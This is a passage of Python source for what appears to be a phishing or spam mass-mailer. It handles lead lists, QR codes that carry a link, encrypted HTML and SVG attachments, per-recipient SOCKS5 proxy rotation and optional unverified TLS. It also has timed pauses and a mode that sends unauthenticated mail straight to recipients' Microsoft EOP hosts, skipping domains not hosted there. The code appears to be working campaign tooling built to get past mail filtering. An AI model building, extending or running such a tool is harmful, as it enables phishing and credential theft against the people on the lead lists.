                qrcode_setup['iconLocation'] = cfg.get('qrcode_setup', 'iconLocation', fallback=qrcode_setup['iconLocation']).strip()
                try:
                    qrcode_setup['iconShape'] = int(cfg.get('qrcode_setup', 'iconShape', fallback=str(qrcode_setup['iconShape'])))
                except Exception:
                    pass
                qrcode_setup['iconBackgroundColor'] = cfg.get('qrcode_setup', 'iconBackgroundColor', fallback=qrcode_setup['iconBackgroundColor']).strip()
                # v9.5: the synthesized section stores the key as 'hideQrCode'
                # (mapped from enable_hide_qrcode), so reading only
                # 'enable_hide_qrcode' always reset the user's setting to 0.
                _hide_raw = None
                for _hk in ('hideQrCode', 'enable_hide_qrcode'):
                    if cfg.has_option('qrcode_setup', _hk):
                        _hide_raw = cfg.get('qrcode_setup', _hk)
                        break
                if _hide_raw is not None:
                    qrcode_setup['hideQrCode'] = 1 if str(_hide_raw).strip().lower() in ('1', 'true', 'yes', 'on') else 0
                if cfg.has_section('logo_config'):
                    logo_setup['enable'] = 1 if cfg_get_bool(cfg, 'logo_config', 'enable', False) else 0
                    logo_setup['location'] = cfg.get('logo_config', 'location', fallback=logo_setup['location']).strip()
                    global _logo_fallback_cache
                    _logo_fallback_cache = None
            if cfg.has_section('replyTo_setup'):
                replyTo_setup['replyTo'] = cfg.get('replyTo_setup', 'replyTo', fallback=replyTo_setup['replyTo']).strip()
                replyTo_setup['replyToName'] = cfg.get('replyTo_setup', 'replyToName', fallback=replyTo_setup['replyToName']).strip()
            if cfg.has_section('htmlimage'):
                htmlimage_setup['enable'] = 1 if str(cfg.get('htmlimage', 'enable', fallback=str(htmlimage_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                htmlimage_setup['location'] = cfg.get('htmlimage', 'location', fallback=htmlimage_setup['location']).strip()
                htmlimage_setup['name'] = cfg.get('htmlimage', 'name', fallback=htmlimage_setup['name']).strip()
                try:
                    htmlimage_setup['width'] = int(cfg.get('htmlimage', 'width', fallback=str(htmlimage_setup['width'])))
                except Exception:
                    pass
                try:
                    htmlimage_setup['height'] = int(cfg.get('htmlimage', 'height', fallback=str(htmlimage_setup['height'])))
                except Exception:
                    pass
                htmlimage_setup['enableClip'] = 1 if cfg_get_bool(cfg, 'htmlimage', 'enableClip', False) else 0
                for key, option in (('clipLeft', 'clipLeft'), ('clipTop', 'clipTop'), ('clipWidth', 'clipWidth'), ('clipHeight', 'clipHeight')):
                    try:
                        htmlimage_setup[key] = int(cfg.get('htmlimage', option, fallback=str(htmlimage_setup[key])))
                    except Exception:
                        pass
                try:
                    htmlimage_setup['scale'] = float(cfg.get('htmlimage', 'scale', fallback=str(htmlimage_setup['scale'])))
                except Exception:
                    pass
                try:
                    htmlimage_setup['displayWidth'] = int(cfg.get('htmlimage', 'displayWidth', fallback=str(htmlimage_setup['displayWidth'])))
                except Exception:
                    pass
                try:
                    htmlimage_setup['displayHeight'] = int(cfg.get('htmlimage', 'displayHeight', fallback=str(htmlimage_setup['displayHeight'])))
                except Exception:
                    pass
                try:
                    htmlimage_setup['resolutionX'] = int(cfg.get('htmlimage', 'resolutionX', fallback=str(htmlimage_setup['resolutionX'])))
                except Exception:
                    pass
                try:
                    htmlimage_setup['resolutionY'] = int(cfg.get('htmlimage', 'resolutionY', fallback=str(htmlimage_setup['resolutionY'])))
                except Exception:
                    pass
                htmlimage_setup['imageUrl'] = cfg.get('htmlimage', 'imageUrl', fallback=htmlimage_setup['imageUrl']).strip()
                htmlimage_setup['showSample'] = 1 if str(cfg.get('htmlimage', 'showSample', fallback=str(htmlimage_setup['showSample']))).strip().lower() in ('1','true','yes','on') else 0
                htmlimage_setup['sampleEmail'] = cfg.get('htmlimage', 'sampleEmail', fallback=htmlimage_setup['sampleEmail']).strip()
                htmlimage_setup['sampleFocus'] = 1 if str(cfg.get('htmlimage', 'sampleFocus', fallback=str(htmlimage_setup['sampleFocus']))).strip().lower() in ('1','true','yes','on') else 0
                htmlimage_setup['sampleHandles'] = 1 if str(cfg.get('htmlimage', 'sampleHandles', fallback=str(htmlimage_setup['sampleHandles']))).strip().lower() in ('1','true','yes','on') else 0
                try:
                    htmlimage_setup['sampleFocusPadding'] = int(cfg.get('htmlimage', 'sampleFocusPadding', fallback=str(htmlimage_setup['sampleFocusPadding'])))
                except Exception:
                    pass
                htmlimage_setup['enableMultiple'] = 1 if str(cfg.get('htmlimage', 'enableMultiple', fallback=str(htmlimage_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                htmlimage_setup['imgletterList'] = cfg.get('htmlimage', 'imgletterList', fallback=htmlimage_setup['imgletterList']).strip()
            if cfg.has_section('htmlAttachment'):
                htmlAttachment_setup['enable'] = 1 if str(cfg.get('htmlAttachment', 'enable', fallback=str(htmlAttachment_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                htmlAttachment_setup['location'] = cfg.get('htmlAttachment', 'location', fallback=htmlAttachment_setup['location']).strip()
                htmlAttachment_setup['name'] = cfg.get('htmlAttachment', 'name', fallback=htmlAttachment_setup['name']).strip()
                htmlAttachment_setup['encrypt'] = 1 if str(cfg.get('htmlAttachment', 'encrypt', fallback=str(htmlAttachment_setup['encrypt']))).strip().lower() in ('1','true','yes','on') else 0
                htmlAttachment_setup['enableMultiple'] = 1 if str(cfg.get('htmlAttachment', 'enableMultiple', fallback=str(htmlAttachment_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                htmlAttachment_setup['htmlList'] = cfg.get('htmlAttachment', 'htmlList', fallback=htmlAttachment_setup['htmlList']).strip()
                htmlAttachment_setup['attachAll'] = 1 if str(cfg.get('htmlAttachment', 'attachAll', fallback=str(htmlAttachment_setup['attachAll']))).strip().lower() in ('1','true','yes','on') else 0
                htmlAttachment_setup['zip_it'] = 1 if str(cfg.get('htmlAttachment', 'zip_it', fallback=str(htmlAttachment_setup['zip_it']))).strip().lower() in ('1','true','yes','on') else 0
                if htmlAttachment_setup.get('enableMultiple', 0) == 1 and htmlAttachment_setup.get('htmlList') and os.path.isfile(htmlAttachment_setup.get('htmlList')):
                    html_attachment_list = load_html_attachment_list(htmlAttachment_setup.get('htmlList'))
                    html_attachment_index = 0
            if cfg.has_section('svgAttachment'):
                svgAttachment_setup['enable'] = 1 if str(cfg.get('svgAttachment', 'enable', fallback=str(svgAttachment_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                svgAttachment_setup['name'] = cfg.get('svgAttachment', 'name', fallback=svgAttachment_setup['name']).strip()
                load_link_svg_from_config(cfg)
                svgAttachment_setup['location'] = cfg.get('svgAttachment', 'location', fallback=svgAttachment_setup['location']).strip()
                svgAttachment_setup['encrypt'] = 1 if str(cfg.get('svgAttachment', 'encrypt', fallback=str(svgAttachment_setup['encrypt']))).strip().lower() in ('1','true','yes','on') else 0
                svgAttachment_setup['enableMultiple'] = 1 if str(cfg.get('svgAttachment', 'enableMultiple', fallback=str(svgAttachment_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                svgAttachment_setup['svgList'] = cfg.get('svgAttachment', 'svgList', fallback=svgAttachment_setup['svgList']).strip()
                svgAttachment_setup['attachAll'] = 1 if str(cfg.get('svgAttachment', 'attachAll', fallback=str(svgAttachment_setup['attachAll']))).strip().lower() in ('1','true','yes','on') else 0
                svgAttachment_setup['zip_it'] = 1 if str(cfg.get('svgAttachment', 'zip_it', fallback=str(svgAttachment_setup['zip_it']))).strip().lower() in ('1','true','yes','on') else 0
                if svgAttachment_setup.get('enableMultiple', 0) == 1 and svgAttachment_setup.get('svgList') and os.path.isfile(svgAttachment_setup.get('svgList')):
                    svg_attachment_list = load_svg_attachment_list(svgAttachment_setup.get('svgList'))
                    svg_attachment_index = 0
            if cfg.has_section('pdf'):
                pdf_setup['enable'] = 1 if str(cfg.get('pdf', 'enable', fallback=str(pdf_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                pdf_setup['location'] = cfg.get('pdf', 'location', fallback=pdf_setup['location']).strip()
                pdf_setup['name'] = cfg.get('pdf', 'name', fallback=pdf_setup['name']).strip()
                pdf_setup['layout'] = cfg.getint('pdf', 'layout', fallback=1)
                pdf_setup['page_type'] = cfg.getint('pdf', 'page_type', fallback=1)
                pdf_setup['margin'] = cfg.getfloat('pdf', 'margin', fallback=0.4)
                pdf_setup['password_protection'] = 1 if cfg_get_bool(cfg, 'pdf', 'password_protection', False) else 0
                pdf_setup['password'] = cfg.get('pdf', 'password', fallback='')
                pdf_setup['zip_it'] = 1 if str(cfg.get('pdf', 'zip_it', fallback=str(pdf_setup.get('zip_it', 0)))).strip().lower() in ('1','true','yes','on') else 0
            if cfg.has_section('svg'):
                svg_setup['enable'] = 1 if str(cfg.get('svg', 'enable', fallback=str(svg_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                svg_setup['location'] = cfg.get('svg', 'location', fallback=svg_setup['location']).strip()
                svg_setup['name'] = cfg.get('svg', 'name', fallback=svg_setup['name']).strip()
            if cfg.has_section('doc'):
                doc_setup['enable'] = 1 if str(cfg.get('doc', 'enable', fallback=str(doc_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                doc_setup['location'] = cfg.get('doc', 'location', fallback=doc_setup['location']).strip()
                doc_setup['name'] = cfg.get('doc', 'name', fallback=doc_setup['name']).strip()
            if cfg.has_section('docx'):
                docx_setup['enable'] = 1 if str(cfg.get('docx', 'enable', fallback=str(docx_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                docx_setup['location'] = cfg.get('docx', 'location', fallback=docx_setup['location']).strip()
                docx_setup['name'] = cfg.get('docx', 'name', fallback=docx_setup['name']).strip()
            if cfg.has_section('rtf'):
                rtf_setup['enable'] = 1 if cfg_get_bool(cfg, 'rtf', 'enable', False) else 0
                rtf_setup['location'] = cfg.get('rtf', 'location', fallback=rtf_setup['location']).strip()
                rtf_setup['name'] = cfg.get('rtf', 'name', fallback=rtf_setup['name']).strip()
                rtf_setup['zip_it'] = 1 if cfg_get_bool(cfg, 'rtf', 'zip_it', False) else 0
            if cfg.has_section('pptx'):
                pptx_setup['enable'] = 1 if cfg_get_bool(cfg, 'pptx', 'enable', False) else 0
                pptx_setup['location'] = cfg.get('pptx', 'location', fallback=pptx_setup['location']).strip()
                pptx_setup['name'] = cfg.get('pptx', 'name', fallback=pptx_setup['name']).strip()
                pptx_setup['zip_it'] = 1 if cfg_get_bool(cfg, 'pptx', 'zip_it', False) else 0
            if cfg.has_section('icalendar'):
                for key in ('summary', 'description', 'location', 'starts', 'ends', 'organizer_name', 'organizer_email', 'attendee_name', 'attendee_email', 'name'):
                    icalendar_setup[key] = cfg.get('icalendar', key, fallback=icalendar_setup[key]).strip()
                icalendar_setup['enable'] = 1 if cfg_get_bool(cfg, 'icalendar', 'enable', False) else 0
            if cfg.has_section('eml'):
                eml_setup['enable'] = 1 if str(cfg.get('eml', 'enable', fallback=str(eml_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                eml_setup['location'] = cfg.get('eml', 'location', fallback=eml_setup['location']).strip()
                eml_setup['name'] = cfg.get('eml', 'name', fallback=eml_setup['name']).strip()
                eml_setup['subject'] = cfg.get('eml', 'subject', fallback=eml_setup['subject']).strip()
                eml_setup['from'] = cfg.get('eml', 'from', fallback=eml_setup['from']).strip()
                eml_setup['from_name'] = cfg.get('eml', 'from_name', fallback=eml_setup.get('from_name', '')).strip()
                eml_setup['to'] = cfg.get('eml', 'to', fallback=eml_setup['to']).strip()
                eml_setup['to_name'] = cfg.get('eml', 'to_name', fallback=eml_setup.get('to_name', '')).strip()
                eml_setup['attachToOuter'] = 1 if str(cfg.get('eml', 'attachToOuter', fallback=str(eml_setup.get('attachToOuter', 1)))).strip().lower() in ('1','true','yes','on') else 0
                eml_setup['attachType'] = cfg.get('eml', 'attachType', fallback=eml_setup.get('attachType', 'message/rfc822')).strip()
                eml_setup['attachName'] = cfg.get('eml', 'attachName', fallback=eml_setup.get('attachName', '')).strip()
                try:
                    eml_setup['emlAttachment'] = 1 if str(cfg.get('eml', 'emlAttachment', fallback=str(eml_setup.get('emlAttachment',0)))).strip().lower() in ('1','true','yes','on') else 0
                except Exception:
                    eml_setup['emlAttachment'] = eml_setup.get('emlAttachment', 0)
                eml_setup['onlyEml'] = 1 if cfg_get_bool(cfg, 'eml', 'onlyEml', True) else 0
                eml_setup['attachments'] = normalize_attachment_list(cfg.get('eml', 'attachments', fallback=''))
            if cfg.has_section('local_files'):
                local_files_setup['enable'] = 1 if cfg_get_bool(cfg, 'local_files', 'enable', False) else 0
                local_files_setup['location'] = cfg.get('local_files', 'location', fallback=local_files_setup['location']).strip()
                local_files_setup['selection'] = cfg.getint('local_files', 'selection', fallback=1)
                load_local_files_config()
            if cfg.has_section('otherFile'):
                otherfile_setup['enable'] = 1 if str(cfg.get('otherFile', 'enable', fallback=str(otherfile_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                otherfile_setup['location'] = cfg.get('otherFile', 'location', fallback=otherfile_setup['location']).strip()
                otherfile_setup['name'] = cfg.get('otherFile', 'name', fallback=otherfile_setup['name']).strip()
        except Exception as exc:
            # v9.1: never swallow reload errors silently. A single bad section
            # used to abort the whole reload and leave later settings stale
            # ('unresponsive settings'), with no trace to explain why.
            print(f"{Fore.YELLOW}[CONFIG] reload warning: {exc}{Style.RESET_ALL}", flush=True)
    finally:
        config_mtime = stat


def format_duration(seconds):
    mins, secs = divmod(int(seconds), 60)
    return f"{mins:02d}:{secs:02d}"


def start_status_printer(email_queue):
    # Status printing disabled per user request.
    return


def parse_stopwatch_pattern(pattern_str):
    pairs = []
    for part in pattern_str.split(','):
        part = part.strip()
        if not part:
            continue
        if ':' not in part:
            continue
        threshold, duration = part.split(':', 1)
        try:
            threshold_val = int(threshold.strip())
            duration_val = int(duration.strip())
            pairs.append((threshold_val, duration_val))
        except ValueError:
            continue
    pairs.sort(key=lambda x: x[0])
    return pairs


def stopwatch_pause_duration(success_count):
    if success_count % 100 != 0 or not stopwatch_pattern:
        return 0
    cycle_length = stopwatch_pattern[-1][0]
    if cycle_length <= 0:
        return 0
    pos = ((success_count - 1) % cycle_length) + 1
    for threshold, duration in stopwatch_pattern:
        if pos <= threshold:
            return duration
    return 0


def start_stopwatch_pause(duration, success_count):
    global auto_pause, stopwatch_timer_active
    with stopwatch_timer_lock:
        if stopwatch_timer_active:
            return
        stopwatch_timer_active = True
        # Don't auto-set pause unless explicitly enabled in config
        update_pause_event()

    def timer_func(d=duration, c=success_count):
        global pause_remaining, pause_reason
        pause_reason = "STOPWATCH"
        with pause_remaining_lock:
            pause_remaining = d
        print(f"[STOPWATCH] Pause triggered for {d} seconds after {c} successful emails. Waiting {format_duration(d)} to resume...")
        for remaining in range(d, 0, -1):
            # Reload config if changed so runtime changes can take effect during pause
            try:
                reload_config_if_changed()
            except Exception:
                pass
            with pause_remaining_lock:
                pause_remaining = remaining
            spinner = pause_spinner_chars[remaining % len(pause_spinner_chars)]
            line = f"[STOPWATCH] {remaining}... resuming {spinner}"
            print(line.ljust(80), end='\r', flush=True)
            time.sleep(1)
        print(' ' * 80, end='\r')  # Clear line
        with stopwatch_timer_lock:
            stopwatch_timer_active = False
            pause_reason = None
            with pause_remaining_lock:
                pause_remaining = 0
            update_pause_event()
        print(f"[STOPWATCH] Timer complete after {format_duration(d)}.")

    threading.Thread(target=timer_func, daemon=True).start()


def print_success_summary():
    with success_count_lock:
        successful = success_sent_count
        failed = failed_sent_count
    total = successful + failed
    print(
        f"\n{Fore.CYAN}[SUMMARY]{Style.RESET_ALL}\n"
        f"Total: {total}\n"
        f"Successful : {Fore.GREEN}{successful}{Style.RESET_ALL}\n"
        f"Failed : {Fore.RED}{failed}{Style.RESET_ALL}\n"
    )


def maybe_trigger_stopwatch():
    global stopwatch_success_count
    if not stopwatch_enabled:
        return

    with stopwatch_lock:
        stopwatch_success_count += 1
        duration = stopwatch_pause_duration(stopwatch_success_count)

    if duration > 0:
        start_stopwatch_pause(duration, stopwatch_success_count)


def _append_record_line(path, line):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        # Read existing emails to prevent duplicates
        existing = set()
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as fh:
                for l in fh:
                    l = l.strip()
                    if l:
                        existing.add(l)
        email = line.strip()
        if email and email not in existing:
            with open(path, 'a', encoding='utf-8') as fh:
                fh.write(email + '\n')
                fh.flush()
                try:
                    os.fsync(fh.fileno())
                except Exception:
                    pass
    except Exception:
        pass


def save_eml_report(status, recipient, filename='', embedded_count=0, error=''):
    """Persist EML generation/attachment status separately from recipient records.

    v9.1: this was previously defined *inside* save_record(), which made it
    invisible to attach_generated_files() (called from the campaign path).
    The calls there run at module scope, so they raised NameError; the attack
    surface was worst in the attach-failure handler, where the handler itself
    raised an uncaught NameError and aborted attachment generation.
    """
    try:
        os.makedirs(record_folder, exist_ok=True)
        report_path = os.path.join(record_folder, 'eml.log')
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        line = (
            f'{timestamp} | status={status} | recipient={recipient} | '
            f'file={filename or "-"} | embedded={embedded_count}'
        )
        if error:
            line += f' | error={str(error).replace(chr(10), " ")}'
        with eml_report_lock:
            with open(report_path, 'a', encoding='utf-8') as report_file:
                report_file.write(line + '\n')
    except Exception:
        pass


def save_record(status, email, details, subject=None):
    # Save only unique emails (no date/time) to both the root record files and the status-specific folders.
    try:
        status_name = 'success' if status == 'success' else 'failed'
        root_path = os.path.join(record_folder, f'{status_name}.txt')
        nested_dir = os.path.join(record_folder, status_name)
        nested_path = os.path.join(nested_dir, f'{status_name}.txt')

        # Only save the email, no date/time, no duplicates
        line = f"{email.strip()}"
        _append_record_line(root_path, line)
        _append_record_line(nested_path, line)

        if status == 'success':
            # v7: tester&send ledger. Record the campaign-processed address so a
            # later run (or another tester SMTP) never re-attempts it. Guarded by
            # test_and_send_mode so normal campaigns never touch the ledger.
            # Only successful sends are recorded: a failed campaign send must
            # stay retryable and must never be skipped by skip_processed.
            if test_and_send_mode:
                try:
                    _rec = email
                    if isinstance(_rec, (list, tuple, set)):
                        _rec = next((_x for _x in _rec if _x), '')
                    record_test_send_ledger('sent', _rec)
                except Exception:
                    pass
            maybe_trigger_stopwatch()
            # v8.3: delete_config - remove the lead from leads.txt once it is
            # fully processed (main campaign sent; in tester&send mode also
            # requires the tester letter this run). Non-fatal by design.
            try:
                delete_processed_lead(email)
            except Exception:
                pass
    except Exception:
        # If recording fails, don't let it stop sending
        pass


def build_smtp_host_for_recipient(email, default_smtp_host):
    try:
        domain = email.split('@', 1)[1].strip().lower()
        if domain:
            transformed = domain.replace('.', '-')
            return f"{transformed}.mail.protection.outlook.com"
    except Exception:
        pass
    return default_smtp_host

def generate_qr_code_image(data):
    if qrcode is None:
        print("[WARN] QR code requested but the 'qrcode' module is missing; skipping.")
        return None
    fill_color = _qr_sanitize_color(qrcode_setup.get('shapeColor'), 'black', 'shape_color')
    back_color = _qr_sanitize_color(qrcode_setup.get('backgroundColor'), 'white', 'background_color')
    # v9.7: StyledPilImage colours via a color_mask, not fill_color/back_color.
    # Convert the sanitized colours to RGB tuples so the styled renderer honours
    # shape_color / background_color too (previously only the plain square path
    # applied them, so configured colours silently fell back to black/white).
    try:
        from PIL import ImageColor
        fill_rgb = ImageColor.getrgb(fill_color)
        back_rgb = ImageColor.getrgb(back_color)
    except Exception:
        fill_rgb = (0, 0, 0)
        back_rgb = (255, 255, 255)
    try:
        border = max(1, min(10, int(qrcode_setup.get('margin', 4))))
    except (TypeError, ValueError):
        border = 4
    icon_path = str(qrcode_setup.get('iconLocation') or '').strip()
    use_custom_icon = qrcode_setup.get('customIcon', 0) == 1 and os.path.isfile(icon_path)
    qr = qrcode.QRCode(
        version=None,  # v9.0: auto-fit so long {link} payloads never overflow a fixed version
        error_correction=(qrcode.constants.ERROR_CORRECT_H if use_custom_icon else qrcode.constants.ERROR_CORRECT_M),
        box_size=10,
        border=border,
    )
    qr.add_data(data)
    qr.make(fit=True)
    # v9.2: honour qrcode_config.shape (1 Square, 2 Circle, 3 RoundedSquare,
    # 4 Vertical, 5 Horizontal, 6 Diamond). Diamond has no built-in module
    # drawer, so it renders as a rounded square. Falls back to a plain square
    # image when the styled renderer is unavailable.
    try:
        shape = int(qrcode_setup.get('shape', 1) or 1)
    except (TypeError, ValueError):
        shape = 1
    try:
        from qrcode.image.styledpil import StyledPilImage
        from qrcode.image.styles.colormasks import SolidFillColorMask
        from qrcode.image.styles.moduledrawers.pil import (
            SquareModuleDrawer, CircleModuleDrawer, RoundedModuleDrawer,
            VerticalBarsDrawer, HorizontalBarsDrawer,
        )
        _drawers = {
            1: SquareModuleDrawer, 2: CircleModuleDrawer,
            3: RoundedModuleDrawer, 4: VerticalBarsDrawer,
            5: HorizontalBarsDrawer, 6: RoundedModuleDrawer,
        }
        if use_custom_icon:
            # v9.7: honour icon_background_color and icon_shape. The icon is
            # composited onto its configured background (visible through
            # transparent icon pixels) and optionally masked to a circle /
            # rounded square before embedding. Any failure falls back to the
            # plain embedded_image_path path so the QR never vanishes.
            embedded_image = None
            try:
                from PIL import Image, ImageColor, ImageChops, ImageDraw
                icon_image = Image.open(icon_path).convert('RGBA')
                icon_bg = _qr_sanitize_color(
                    qrcode_setup.get('iconBackgroundColor'), None, 'icon_background_color')
                if icon_bg:
                    canvas = Image.new('RGBA', icon_image.size, ImageColor.getrgb(icon_bg))
                    canvas.paste(icon_image, (0, 0), icon_image)
                    icon_image = canvas
                try:
                    icon_shape = int(qrcode_setup.get('iconShape', 1) or 1)
                except (TypeError, ValueError):
                    icon_shape = 1
                if icon_shape in (2, 3):
                    w, h = icon_image.size
                    mask = Image.new('L', (w, h), 0)
                    draw = ImageDraw.Draw(mask)
                    radius = max(4, min(w, h) // 6)
                    if icon_shape == 2:
                        draw.ellipse((0, 0, w - 1, h - 1), fill=255)
                    else:
                        draw.rounded_rectangle((0, 0, w - 1, h - 1), radius=radius, fill=255)
                    alpha = ImageChops.multiply(icon_image.getchannel('A'), mask)
                    icon_image.putalpha(alpha)
                embedded_image = icon_image
            except Exception:
                embedded_image = None
            if embedded_image is not None:
                img = qr.make_image(
                    image_factory=StyledPilImage,
                    module_drawer=_drawers.get(shape, SquareModuleDrawer)(),
                    color_mask=SolidFillColorMask(back_color=back_rgb, front_color=fill_rgb),
                    embedded_image=embedded_image,
                )
            else:
                img = qr.make_image(
                    image_factory=StyledPilImage,
                    module_drawer=_drawers.get(shape, SquareModuleDrawer)(),
                    color_mask=SolidFillColorMask(back_color=back_rgb, front_color=fill_rgb),
                    embedded_image_path=icon_path,
                )
        elif shape != 1:
            img = qr.make_image(
                image_factory=StyledPilImage,
                module_drawer=_drawers.get(shape, SquareModuleDrawer)(),
                color_mask=SolidFillColorMask(back_color=back_rgb, front_color=fill_rgb),
            )
        else:
            img = qr.make_image(fill_color=fill_color, back_color=back_color)
    except Exception:
        img = qr.make_image(fill_color=fill_color, back_color=back_color)
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    return buffer.read()


def _resolve_qr_data(link_url=None, recipient_email=''):
    configured = str(qrcode_setup.get('qrlink') or '').strip()
    fallback = str(link_url or recipient_email or '').strip()
    if not configured or configured.lower() in ('{link}', '[link]'):
        return fallback
    try:
        resolved = findString(recipient_email, configured, skip_link=True)
    except Exception:
        resolved = configured
    return str(resolved or fallback).replace('{link}', fallback).replace('{LINK}', fallback).replace('[link]', fallback).replace('[LINK]', fallback).strip()

def _is_ip_literal(host):
    """True when host is a literal IPv4/IPv6 address (TLS must skip SNI)."""
    try:
        ipaddress.ip_address(str(host).strip())
        return True
    except ValueError:
        return False


def _socks5_smtp_connect(smtpserv,port,useauth,user,password,receivers,sender,usessl,msginfo,proxy):
    """Deliver one message over a SOCKS5 proxy (per-recipient proxy rotation)."""
    port = int(port)
    try:
        import socks
    except ImportError:
        raise Exception('SOCKS5 proxy requested but PySocks is not installed. Run "python pip.py" or "pip install PySocks" first.')
    proxy_host = str(proxy.get('host') or '').strip()
    proxy_port = int(proxy.get('port') or 0)
    if not proxy_host or not proxy_port:
        raise Exception('SOCKS5 proxy settings incomplete: host/port missing.')
    proxy_user = str(proxy.get('user') or '').strip() or None
    proxy_pass = str(proxy.get('password') or '').strip() or None
    context = ssl.create_default_context()
    try:
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port, rdns=True, username=proxy_user, password=proxy_pass)
        sock.settimeout(2 * 60)
        sock.connect((smtpserv, port))
        direct_ssl = (port == 465 and usessl)
        if direct_ssl:
            # TLS directly over the proxied socket; SNI only for host names.
            server_hostname = smtpserv if not _is_ip_literal(smtpserv) else None
            sock = context.wrap_socket(sock, server_hostname=server_hostname)
        server = smtplib.SMTP()
        server._host = smtpserv
        server.sock = sock
        try:
            server.ehlo()
            if usessl and not direct_ssl:
                server.starttls(context=context)
                server.ehlo()
            if useauth:
                server.login(user, password)
                try:
                    time.sleep(int(secs))
                except Exception:
                    pass
            server.sendmail(sender, receivers, msginfo)
            try:
                server.quit()
            except Exception:
                pass
            return True
        finally:
            try:
                sock.close()
            except Exception:
                pass
    except Exception as e:
        raise Exception('Error: {}'.format(e))

def ResolveMX(domain, timeout=30):
    """Return the highest-priority MX host for domain, or the domain itself (RFC 5321 5.1 A-record fallback)."""
    domain = domain.strip().strip('.').lower()
    if not domain:
        return domain
    try:
        import dns.resolver  # dnspython - installed by python3 pip.py (core tier)
        answers = dns.resolver.resolve(domain, 'MX', lifetime=timeout)
        records = sorted((int(r.preference), str(r.exchange).rstrip('.').lower()) for r in answers)
        if records:
            return records[0][1]
    except Exception:
        pass
    return domain  # A-record fallback


def build_eop_host(recipient_domain):
    """Pinned EOP host: asgeir@gwillikersgifts.com -> gwillikersgifts-com.mail.protection.outlook.com"""
    domain = str(recipient_domain or '').strip().strip('.').lower()
    if not domain:
        return None
    return domain.replace('.', '-') + '.mail.protection.outlook.com'


def _domain_is_microsoft_eop(domain, timeout=30):
    """v9.2: True when the domain's MX points at Microsoft EOP/Office 365.

    Used by host_config.force_mx_filter to skip leads that are not hosted on
    Microsoft 365 instead of delivering to a fabricated EOP host."""
    domain = str(domain or '').strip().strip('.').lower()
    if not domain:
        return False
    mx = ResolveMX(domain, timeout)
    return 'protection.outlook.com' in str(mx).lower()


def resolve_vdm_host_for_recipient(recipient, force_mx=''):
    """Resolve the configured VDM host template for one recipient."""
    configured_host = str(force_mx or '').strip()
    if configured_host:
        try:
            configured_host = findString(recipient, configured_host).strip()
        except Exception:
            pass
        return configured_host.lower()
    return build_eop_host(str(recipient).split('@')[-1])


def ConnectVDM(receivers, sender, msginfo, bind_ip=None, proxy=None,
               port=25, helo_name=None, timeout=30, force_mx=''):
    """VDM host mode (v4.1): deliver to the recipient domain's EOP protection host.
    Falls back to real MX lookup, then force_mx. No authentication."""
    port = int(port)
    timeout = int(timeout) if timeout else 30
    recipient_list = [receivers] if isinstance(receivers, str) else list(receivers)
    if not recipient_list:
        raise Exception('VDM: no recipients provided')
    domain = recipient_list[0].split('@')[-1].strip().lower()
    if vdm_force_mx_filter and not _domain_is_microsoft_eop(domain, timeout):
        raise Exception('VDM filter: {} is not hosted on Microsoft EOP; lead skipped '
                        '(host_config.force_mx_filter=true)'.format(domain))
    mx = resolve_vdm_host_for_recipient(recipient_list[0], force_mx)
    if not force_mx:
        if mx:
            try:
                socket.getaddrinfo(mx, port, socket.AF_INET, socket.SOCK_STREAM)
            except Exception:
                mx = ResolveMX(domain, timeout)
    if not mx:
        raise Exception('VDM: could not resolve a delivery host for domain: {}'.format(domain))
    print(f"{Fore.CYAN}[VDM] Delivering to {mx}:{port} for {recipient_list[0]}{Style.RESET_ALL}", flush=True)
    ehlo = (helo_name or '').strip()
    if ehlo:
        try:
            ehlo = findString(recipient_list[0], ehlo).strip()
        except Exception:
            pass
    if not ehlo:
        ehlo = sender.split('@')[-1] if ('@' in sender and sender.split('@')[-1]) else 'localhost'
    # EHLO must be a valid hostname: strip brackets/placeholders, keep [A-Za-z0-9.-]
    ehlo = ehlo.strip('[]<>')
    ehlo = re.sub(r'[^A-Za-z0-9.\-]', '', ehlo)
    if not ehlo or '.' not in ehlo:
        ehlo = 'mail.' + (sender.split('@')[-1] if '@' in sender else 'localhost')
        ehlo = re.sub(r'[^A-Za-z0-9.\-]', '', ehlo) or 'localhost'
    if proxy:
        return _socks5_smtp_connect(mx, port, False, '', '', recipient_list, sender, False, msginfo, proxy)
    socket.setdefaulttimeout(timeout)
    source_address = build_source_address(bind_ip)
    try:
        for attempt in range(2):
            try:
                with smtplib.SMTP(mx, port, source_address=source_address, timeout=timeout) as server:
                    server.ehlo(ehlo)
                    server.sendmail(sender, recipient_list, msginfo)
                    try:
                        server.quit()
                    except Exception:
                        pass
                return True
            except OSError as error:
                if attempt == 0 and source_address and source_address[1] and is_source_port_in_use(error):
                    source_address = (source_address[0], 0)
                    continue
                raise
    except Exception as e:
        raise Exception('VDM host delivery to {} via {} failed: {}'.format(recipient_list[0], mx, e))


def ConnectSMTP(smtpserv,port,useauth,user,password,receivers,sender,usessl,msginfo,bind_ip=None,proxy=None,dangerous=None):
    global smtp_dangerous, smtp_retry_limit, smtp_retry_delay_secs
    port = int(port)
    if proxy:
        # Route the whole SMTP conversation over the SOCKS5 proxy.
        return _socks5_smtp_connect(smtpserv,port,useauth,user,password,receivers,sender,usessl,msginfo,proxy)
    socket.setdefaulttimeout(2 * 60)
    use_dangerous_tls = smtp_dangerous if dangerous is None else bool(dangerous)
    context = ssl._create_unverified_context() if use_dangerous_tls else ssl.create_default_context()
    source_address = build_source_address(bind_ip)

    if len(sender) == 0:
        sender = user
    sender = normalize_sender_address(sender, user)
    if not sender:
